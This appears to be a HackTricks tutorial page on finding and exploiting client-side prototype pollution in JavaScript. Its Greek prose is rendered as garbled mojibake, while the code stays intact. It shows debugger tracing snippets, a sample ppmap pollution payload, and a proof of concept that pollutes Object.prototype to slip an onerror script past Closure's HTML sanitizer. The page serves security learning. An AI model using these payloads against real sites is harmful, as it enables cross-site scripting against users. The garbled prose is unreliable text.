# Client Side Prototype Pollution

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Discovering using Automatic tools

Î¤Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **ÎºÎ±Î¹** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± **Î½Î± Î²ÏÎ¿Ï…Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ Ï€ÏÏ‰Ï„Î¿Ï„ÏÏ€Î¿Ï… ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚**.

Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ **ÎµÏ€Î­ÎºÏ„Î±ÏƒÎ· Ï„Î¿Ï… Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚ Ï€ÎµÏÎ¹Î®Î³Î·ÏƒÎ·Ï‚** [**PPScan**](https://github.com/msrkp/PPScan) Î³Î¹Î± **Î½Î± ÏƒÎ±ÏÏÏƒÎµÏ„Îµ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î±** Ï„Î¹Ï‚ **ÏƒÎµÎ»Î¯Î´ÎµÏ‚** Ï€Î¿Ï… **Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·** Î³Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ Ï€ÏÏ‰Ï„Î¿Ï„ÏÏ€Î¿Ï… ÏÏÎ¸Î¼Î¹ÏƒÎ·Ï‚.

### Debugging where a property is used <a href="#id-5530" id="id-5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### Î•ÏÏÎµÏƒÎ· Ï„Î·Ï‚ ÏÎ¯Î¶Î±Ï‚ Ï„Î¿Ï… Prototype Pollution <a href="#id-5530" id="id-5530"></a>

ÎœÏŒÎ»Î¹Ï‚ ÎµÎ½Ï„Î¿Ï€Î¹ÏƒÏ„ÎµÎ¯ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± prototype pollution Î±Ï€ÏŒ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î±Ï€ÏŒ Ï„Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î±, ÎºÎ±Î¹ Î±Î½ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Ï…Ï€ÎµÏÎ²Î¿Î»Î¹ÎºÎ¬ Ï€ÎµÏÎ¯Ï€Î»Î¿ÎºÎ¿Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï‚ Î½Î± Î²ÏÎµÎ¹Ï‚ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Î±Î½Î±Î¶Î·Ï„ÏÎ½Ï„Î±Ï‚ Î»Î­Î¾ÎµÎ¹Ï‚-ÎºÎ»ÎµÎ¹Î´Î¹Î¬ ÏŒÏ€Ï‰Ï‚ `location.hash`, `decodeURIComponent`, Î® `location.search` ÏƒÏ„Î± Chrome Developer Tools. Î‘Ï…Ï„Î® Î· Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ· ÏƒÎ¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÎ¹Ï‚ Ï„Î·Î½ ÎµÏ…Î¬Î»Ï‰Ï„Î· ÎµÎ½ÏŒÏ„Î·Ï„Î± Ï„Î¿Ï… JavaScript ÎºÏÎ´Î¹ÎºÎ±.

Î“Î¹Î± Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎµÏ‚ ÎºÎ±Î¹ Ï€Î¹Î¿ Ï€ÎµÏÎ¯Ï€Î»Î¿ÎºÎµÏ‚ Î²Î¬ÏƒÎµÎ¹Ï‚ ÎºÏÎ´Î¹ÎºÎ±, Î¼Î¹Î± Î±Ï€Î»Î® Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î³Î¹Î± Î½Î± Î±Î½Î±ÎºÎ±Î»ÏÏˆÎµÎ¹Ï‚ Ï„Î¿Î½ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ ÎºÏÎ´Î¹ÎºÎ± Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Ï„Î± ÎµÎ¾Î®Ï‚ Î²Î®Î¼Î±Ï„Î±:

1. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¯Î·ÏƒÎµ Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Î³Î¹Î± Î½Î± ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÎµÎ¹Ï‚ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± ÎºÎ±Î¹ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹Ï‚ Î­Î½Î± payload ÏƒÏ‡ÎµÎ´Î¹Î±ÏƒÎ¼Î­Î½Î¿ Î½Î± Î¿ÏÎ¯ÏƒÎµÎ¹ Î¼Î¹Î± Î¹Î´Î¹ÏŒÏ„Î·Ï„Î± ÏƒÏ„Î¿Î½ ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î±ÏƒÏ„Î®. ÎˆÎ½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ ppmap Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Î¿Î¹Î¬Î¶ÎµÎ¹ Î¼Îµ: `constructor[prototype][ppmap]=reserved`.
2. ÎŸÏÎ¯ÏƒÏ„Îµ Î­Î½Î± breakpoint ÏƒÏ„Î·Î½ Ï€ÏÏÏ„Î· Î³ÏÎ±Î¼Î¼Î® Ï„Î¿Ï… JavaScript ÎºÏÎ´Î¹ÎºÎ± Ï€Î¿Ï… Î¸Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ ÏƒÏ„Î· ÏƒÎµÎ»Î¯Î´Î±. Î‘Î½Î±Î½ÎµÏÏƒÏ„Îµ Ï„Î· ÏƒÎµÎ»Î¯Î´Î± Î¼Îµ Ï„Î¿ payload, Ï€Î±Î³ÏÎ½Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ breakpoint.
3. Î•Î½Ï Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î¿Ï… JavaScript ÎµÎ¯Î½Î±Î¹ Ï€Î±Î³Ï‰Î¼Î­Î½Î·, ÎµÎºÏ„Î­Î»ÎµÏƒÎµ Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ ÏƒÏ„Î·Î½ ÎºÎ¿Î½ÏƒÏŒÎ»Î± JS. Î‘Ï…Ï„ÏŒ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿ Î¸Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ ÏƒÎ®Î¼Î± ÏŒÏ„Î±Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯ Î· Î¹Î´Î¹ÏŒÏ„Î·Ï„Î± 'ppmap', Î²Î¿Î·Î¸ÏÎ½Ï„Î±Ï‚ ÏƒÏ„Î·Î½ Ï„Î¿Ï€Î¿Î¸Î­Ï„Î·ÏƒÎ· Ï„Î·Ï‚ Ï€ÏÎ¿Î­Î»ÎµÏ…ÏƒÎ®Ï‚ Ï„Î·Ï‚:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. Î Î»Î¿Î·Î³Î·Î¸ÎµÎ¯Ï„Îµ Ï€Î¯ÏƒÏ‰ ÏƒÏ„Î·Î½ ÎºÎ±ÏÏ„Î­Î»Î± **Sources** ÎºÎ±Î¹ ÎµÏ€Î¹Î»Î­Î¾Ï„Îµ â€œResume script executionâ€. Î¤Î¿ JavaScript Î¸Î± ÏƒÏ…Î½ÎµÏ‡Î¯ÏƒÎµÎ¹ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÎºÎ±Î¹ Î· Î¹Î´Î¹ÏŒÏ„Î·Ï„Î± 'ppmap' Î¸Î± Î¼Î¿Î»Ï…Î½Î¸ÎµÎ¯ ÏŒÏ€Ï‰Ï‚ Î±Î½Î±Î¼ÎµÎ½ÏŒÏ„Î±Î½. Î— Ï‡ÏÎ®ÏƒÎ· Ï„Î¿Ï… Ï€Î±ÏÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿Ï… Î±Ï€Î¿ÏƒÏ€Î¬ÏƒÎ¼Î±Ï„Î¿Ï‚ Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½ÎµÎ¹ Ï„Î·Î½ Î±Î½Î±Î³Î½ÏÏÎ¹ÏƒÎ· Ï„Î·Ï‚ Î±ÎºÏÎ¹Î²Î¿ÏÏ‚ Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î±Ï‚ ÏŒÏ€Î¿Ï… Î· Î¹Î´Î¹ÏŒÏ„Î·Ï„Î± 'ppmap' Î¼Î¿Î»ÏÎ½ÎµÏ„Î±Î¹. Î•Î¾ÎµÏ„Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿ **Call Stack**, Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï€Î±ÏÎ±Ï„Î·ÏÎ·Î¸Î¿ÏÎ½ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ¬ ÏƒÏ„Î¿Î¯Î²ÎµÏ‚ ÏŒÏ€Î¿Ï… ÏƒÏ…Î½Î­Î²Î· Î· Î¼ÏŒÎ»Ï…Î½ÏƒÎ·.

ÎŒÏ„Î±Î½ Î±Ï€Î¿Ï†Î±ÏƒÎ¯Î¶ÎµÏ„Îµ Ï€Î¿Î¹Î± ÏƒÏ„Î¿Î¯Î²Î± Î½Î± ÎµÏÎµÏ…Î½Î®ÏƒÎµÏ„Îµ, ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Ï‡Î½Î¬ Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î½Î± ÏƒÏ„Î¿Ï‡ÎµÏÎµÏ„Îµ ÏƒÎµ ÏƒÏ„Î¿Î¯Î²ÎµÏ‚ Ï€Î¿Ï… ÏƒÏ‡ÎµÏ„Î¯Î¶Î¿Î½Ï„Î±Î¹ Î¼Îµ Î±ÏÏ‡ÎµÎ¯Î± Î²Î¹Î²Î»Î¹Î¿Î¸Î·ÎºÏÎ½ JavaScript, ÎºÎ±Î¸ÏÏ‚ Î· Î¼ÏŒÎ»Ï…Î½ÏƒÎ· Ï€ÏÏ‰Ï„Î¿Ï„ÏÏ€Ï‰Î½ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÏƒÏ…Ï‡Î½Î¬ Î¼Î­ÏƒÎ± ÏƒÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚. Î•Î½Ï„Î¿Ï€Î¯ÏƒÏ„Îµ Ï„Î· ÏƒÏ‡ÎµÏ„Î¹ÎºÎ® ÏƒÏ„Î¿Î¯Î²Î± ÎµÎ¾ÎµÏ„Î¬Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ® Ï„Î·Ï‚ Î¼Îµ Î±ÏÏ‡ÎµÎ¯Î± Î²Î¹Î²Î»Î¹Î¿Î¸Î·ÎºÏÎ½ (Î¿ÏÎ±Ï„Î¬ ÏƒÏ„Î· Î´ÎµÎ¾Î¹Î¬ Ï€Î»ÎµÏ…ÏÎ¬, Ï€Î±ÏÏŒÎ¼Î¿Î¹Î± Î¼Îµ Î¼Î¹Î± ÎµÎ¹ÎºÏŒÎ½Î± Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡ÎµÏ„Î±Î¹ Î³Î¹Î± ÎºÎ±Î¸Î¿Î´Î®Î³Î·ÏƒÎ·). Î£Îµ ÏƒÎµÎ½Î¬ÏÎ¹Î± Î¼Îµ Ï€Î¿Î»Î»Î­Ï‚ ÏƒÏ„Î¿Î¯Î²ÎµÏ‚, ÏŒÏ€Ï‰Ï‚ Î±Ï…Ï„Î­Ï‚ ÏƒÏ„Î¹Ï‚ Î³ÏÎ±Î¼Î¼Î­Ï‚ 4 ÎºÎ±Î¹ 6, Î· Î»Î¿Î³Î¹ÎºÎ® ÎµÏ€Î¹Î»Î¿Î³Î® ÎµÎ¯Î½Î±Î¹ Î· ÏƒÏ„Î¿Î¯Î²Î± ÏƒÏ„Î· Î³ÏÎ±Î¼Î¼Î® 4, ÎºÎ±Î¸ÏÏ‚ Î±Î½Ï„Î¹Ï€ÏÎ¿ÏƒÏ‰Ï€ÎµÏÎµÎ¹ Ï„Î·Î½ Î±ÏÏ‡Î¹ÎºÎ® ÎµÎ¼Ï†Î¬Î½Î¹ÏƒÎ· Î¼ÏŒÎ»Ï…Î½ÏƒÎ·Ï‚ ÎºÎ±Î¹ ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Ï„Î·Î½ ÏÎ¯Î¶Î± Ï„Î·Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚. ÎšÎ¬Î½Î¿Î½Ï„Î±Ï‚ ÎºÎ»Î¹Îº ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î± Î¸Î± ÏƒÎ±Ï‚ ÎºÎ±Ï„ÎµÏ…Î¸ÏÎ½ÎµÎ¹ ÏƒÏ„Î¿Î½ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ ÎºÏÎ´Î¹ÎºÎ±.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Î•ÏÏÎµÏƒÎ· Gadget Î£ÎºÏÎ¹Ï€Ï„ÏÎ½

Î¤Î¿ gadget ÎµÎ¯Î½Î±Î¹ Î¿ **ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï€Î¿Ï… Î¸Î± ÎºÎ±ÎºÎ¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î¼ÏŒÎ»Î¹Ï‚ Î±Î½Î±ÎºÎ±Î»Ï…Ï†Î¸ÎµÎ¯ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± PP**.

Î•Î¬Î½ Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÎµÎ¯Î½Î±Î¹ Î±Ï€Î»Î®, Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± **Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎ¿Ï…Î¼Îµ** Î»Î­Î¾ÎµÎ¹Ï‚-ÎºÎ»ÎµÎ¹Î´Î¹Î¬ ÏŒÏ€Ï‰Ï‚ **`srcdoc/innerHTML/iframe/createElement`** ÎºÎ±Î¹ Î½Î± ÎµÎ»Î­Î³Î¾Î¿Ï…Î¼Îµ Ï„Î¿Î½ Ï€Î·Î³Î±Î¯Î¿ ÎºÏÎ´Î¹ÎºÎ± ÎºÎ±Î¹ Î½Î± Î´Î¿ÏÎ¼Îµ Î±Î½ Î¿Î´Î·Î³ÎµÎ¯ ÏƒÎµ **ÎµÎºÏ„Î­Î»ÎµÏƒÎ· javascript**. ÎœÎµÏÎ¹ÎºÎ­Ï‚ Ï†Î¿ÏÎ­Ï‚, Î¿Î¹ Î±Î½Î±Ï†ÎµÏÏŒÎ¼ÎµÎ½ÎµÏ‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Î·Î½ Î²ÏÎ¿Ï…Î½ ÎºÎ±Î¸ÏŒÎ»Î¿Ï… gadgets. Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Î· ÎºÎ±Î¸Î±ÏÎ® Î±Î½Î±ÏƒÎºÏŒÏ€Î·ÏƒÎ· Ï„Î¿Ï… Ï€Î·Î³Î±Î¯Î¿Ï… ÎºÏÎ´Î¹ÎºÎ± Î±Ï€Î¿ÎºÎ±Î»ÏÏ€Ï„ÎµÎ¹ Î¼ÎµÏÎ¹ÎºÎ¬ Ï‰ÏÎ±Î¯Î± gadgets ÏŒÏ€Ï‰Ï‚ Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±.

### Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î•ÏÏÎµÏƒÎ·Ï‚ Gadget PP ÏƒÏ„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Ï„Î·Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ·Ï‚ Mithil

Î•Î»Î­Î³Î¾Ï„Îµ Î±Ï…Ï„Î® Ï„Î· Î³ÏÎ±Ï†Î®: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Î‘Î½Î±ÏƒÏÎ½Î¸ÎµÏƒÎ· payloads Î³Î¹Î± ÎµÏ…Î¬Î»Ï‰Ï„ÎµÏ‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· HTML Sanitizers Î¼Î­ÏƒÏ‰ PP

[**Î‘Ï…Ï„Î® Î· Î­ÏÎµÏ…Î½Î±**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ gadgets PP Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± **Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎ¿Ï…Î½ Ï„Î¹Ï‚ Î±Ï€Î¿Î»Ï…Î¼Î¬Î½ÏƒÎµÎ¹Ï‚** Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Î¿ÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎµÏ‚ HTML sanitizers:

* **sanitize-html**

<figure><img src="../../../.gitbook/assets/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* **dompurify**

<figure><img src="../../../.gitbook/assets/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î· HackTricks</summary>

* Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·Î½** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ ÎºÏŒÎ»Ï€Î± hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
